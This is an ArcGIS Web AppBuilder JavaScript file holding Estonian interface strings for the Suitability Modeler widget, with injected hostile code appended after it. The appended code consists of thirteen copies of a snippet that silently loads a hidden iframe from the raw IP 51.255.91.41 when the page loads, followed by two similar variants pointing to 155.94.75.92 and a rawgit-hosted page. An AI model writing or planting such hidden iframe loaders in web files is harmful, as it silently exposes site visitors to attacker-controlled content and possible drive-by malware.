// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Sobivuse modelleerija",general:{clear:"T\u00fchjenda",cancel:"Loobu",save:"K\u00e4ivita",saveAs:"Ekspordi"},saveModel:{save:"Ekspordi",title:"Nimi: ",summary:"Kokkuv\u00f5te: ",description:"Kirjeldus: ",tags:"M\u00e4rks\u00f5nad: ",folder:"Kaust: ",homeFolderPattern:"{username} (Esileht)",failed:"Eksport nurjus."},util:{colorRamp:{1:"\u00c4\u00e4rmiselt n\u00f5rk",2:"V\u00e4ga n\u00f5rk",3:"N\u00f5rk",4:"N\u00f5rgalt keskmine",5:"Keskmine",
6:"Tugevalt keskmine",7:"Tugev",8:"V\u00e4ga tugev",9:"\u00c4\u00e4rmiselt tugev",low:"N\u00f5rk",high:"Tugev",tipPattern:"{label} ({value})",flipCaption:"P\u00f6\u00f6ra"}},wro:{caption:"Sobivuse modelleerija",browsePrompt:"Kaalutud \u00fclekatte teenus",selectLayersCaption:"Vali kihid",selectLayers:"Kihid",designModelCaption:"Kujundusmudel",designModel:"Kujundusmudel",transparency:"L\u00e4bipaistvus",visible:"N\u00e4htav",total:"Kokku",unableToLoad:"Mudelit ei saa laadida.",projectNotOpen:"Projekt pole avatud.",
readMore:"Lisateave",validation:{validating:"Valideerimine...",invalidItemCaption:"Kaalutud \u00fclekatte teenuse hoiatus",notAnImageService:"See \u00fcksus pole pilditeenus.",notAWroService:"See \u00fcksus pole kaalutud \u00fclekatte teenus.",undefinedUrl:"Selle \u00fcksuse URL-i pole m\u00e4\u00e4ratletud.",inaccessible:"Teenus ei ole k\u00e4ttesaadav.",generalError:"\u00dcksust ei saa avada.",missingFieldPattern:"{field} on n\u00f5utav v\u00e4li",notAllowRasterFunction:"parameetri allowRasterFunction v\u00e4\u00e4rtuseks peab olema m\u00e4\u00e4ratud t\u00f5ene",
notNearestResampling:"Meetodi defaultResamplingMethod v\u00e4\u00e4rtus peab olema L\u00e4him",notIsWeightedOverlayProp:"P\u00f5hiatribuudi IsWeightedOverlay v\u00e4\u00e4rtuseks peab olema m\u00e4\u00e4ratud t\u00f5ene",invalidLink:"URL on sobimatu. Valitud kihi saidi avamine nurjus.",unexpectedError:"Ilmnes ootamatu olek.",rangeMessage:"V\u00e4\u00e4rtus peab olema vahemikus ${0}\u2013${1}",rangeMessage100:"V\u00e4\u00e4rtus peab olema vahemikus 0\u2013100",maxLayers:"Teenuses kohta on lubatud k\u00f5ige rohkem ${0} kihti. Enne uue kihi lisamist peate esmalt \u00fche kihi eemaldama.",
notFound:"Kihti ${0} ei leitud kaalutud \u00fclekatte teenusest",wroServiceNotDefined:"Mudeli jaoks pole kaalutud \u00fclekatte teenust m\u00e4\u00e4ratletud.",overlayLayerOutputInvalid:"Kattuva kihi [${0}] uuesti vastendamise vahemike [${1}] v\u00e4ljundv\u00e4\u00e4rtus on puudu v\u00f5i sobimatu",overlayLayerInputInvalid:"Kattuva kihi [${0}] uuesti vastendamise vahemike [${1}] sisendi miinimum-/maksimumv\u00e4\u00e4rtus on puudu v\u00f5i sobimatu",overlayLayerRangesMissing:"Kattuval kihil [${0}] puuduvad uuesti vastendamise vahemikud",
overlayLayerWeight:"Kattuvate kihtide osakaalud peavad andma kokku v\u00e4\u00e4rtuse 100",overlayLayerRequired:"N\u00f5utav on v\u00e4hemalt \u00fcks kattuv kiht",overlayLayerNotDefined:"Kattuv kiht on m\u00e4\u00e4ratlemata",requiresColormap:"Selle rasterfunktsiooni jaoks on vaja v\u00e4rvikaarti, kuid mudelil pole sobivat v\u00e4rvikaardi m\u00e4\u00e4ratlust",createModelError:"Mudeli loomise t\u00f5rge",invalidModel:"Mudel pole sobiv",imageServiceNotDefined:"Pilditeenuse kiht on m\u00e4\u00e4ratlemata",
imageLayerNotDefined:"Pilditeenuse kiht on m\u00e4\u00e4ratlemata",histogramNotDefined:"Kaalutud \u00fclekatte histogrammifunktsiooni pole m\u00e4\u00e4ratletud."},colorRampLabel:{"Green Yellow Red":"Roheline Kollane Punane","Red Yellow Green":"Punane Kollane Roheline","Yellow to Dark Red":"Kollasest tumepunaseni","Dark Red to Yellow":"Tumepunasest kollaseni","Light Gray to Dark Gray":"Helehallist tumehallini","Dark Gray to Light Gray":"Tumehallist helehallini","Light Brown to Dark Brown":"Helepruunist tumepruunini",
"Dark Brown to Light Brown":"Tumepruunist helepruunini","Full Spectrum - Bright Red to Blue":"T\u00e4isspekter \u2013 erepunasest siniseni","Full Spectrum - Bright Blue to Red":"T\u00e4isspekter \u2013 eresinisest punaseni","Partial Spectrum - Yellow to Blue":"Osaline spekter \u2013 kollasest siniseni","Partial Spectrum - Blue to Yellow":"Osaline spekter \u2013 sinisest kollaseni","Yellow-Green to Dark Blue":"Kollakasrohelisest tumesiniseni","Dark Blue to Yellow-Green":"Tumesinisest kollakasroheliseni",
"Cold to Hot Diverging":"K\u00fclmadest toonidest soojade toonideni hajuv","Hot to Cold Diverging":"Kuumast k\u00fclmani, hajuv","Surface - Low to High":"Pind \u2013 madalast k\u00f5rgeni","Surface - High to Low":"Pind \u2013 k\u00f5rgest madalani"}},_localized:{}},"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Luba eksport",startingState:"L\u00e4hteolek:",byUrl:"T\u00fchi mudel",byItem:"Eelseadistatud mudel",imageServiceUrl:"Pilditeenuse URL",validate:"Valideeri",validating:"Valideerimine...",
validated:"URL kehtib.",modelName:"Mudel",selectModel:"Vali",itemSelectorTitle:"Valige mudel",ok:"OK",cancel:"Loobu",description1:"Sobivuse modelleerija aitab leida teatud tegevuse jaoks parima asukoha, prognoosida vastuv\u00f5tlikkust riski suhtes v\u00f5i leida koha, kus midagi v\u00f5ib suure t\u00f5en\u00e4osusega juhtuda. Selle vidinaga saate kombineerida ja kaaluda eri kihte mitme teguri samaaegseks hindamiseks.",description2:"Sobivuse modelleerija kasutab teenusest mudelite loomiseks kiiret, veebip\u00f5hist kaalutud rastri \u00fclekatet. V\u00f5ite alustada t\u00fchja olekuga kaalutud rastri \u00fclekatte (WRO) teenusega v\u00f5i eelseadistatud WRO mudeliga. Anal\u00fc\u00fcsi m\u00e4\u00e4ratlemiseks valige kihid, m\u00e4\u00e4rake kaalud ja reguleerige kihtide klassifikatsiooni. Seej\u00e4rel k\u00e4ivitage modelleerija, visualiseerige tulemused ja soovi korral salvestada tulemused \u00fcksusena oma ettev\u00f5ttesse/portaali.",
description3:"Lugege lisateavet GeoPlanneri sobivuse modelleerija kohta.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});